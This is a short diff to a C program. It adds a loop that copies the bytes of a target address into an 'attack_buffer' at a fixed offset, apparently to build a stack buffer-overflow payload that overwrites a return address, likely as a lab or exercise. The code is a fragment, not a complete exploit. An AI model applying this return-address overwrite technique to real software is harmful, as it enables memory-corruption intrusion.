@@ -36,6 +36,12 @@ main ( int argc, char * argv[] )
 	*a = target;
 	// memset(&attack_buffer[120], target, 4);
 
+	char *ptr = (char*)target;
+
+	for(int i=0;i<6;i++){
+    	*(attack_buffer+72+i) = ptr[i];
+}
+
 	printf("hex: %x\n",attack_buffer[BUF_TO_RET]);
 	printf("&: %x\n",*(&attack_buffer[BUF_TO_RET]));
 
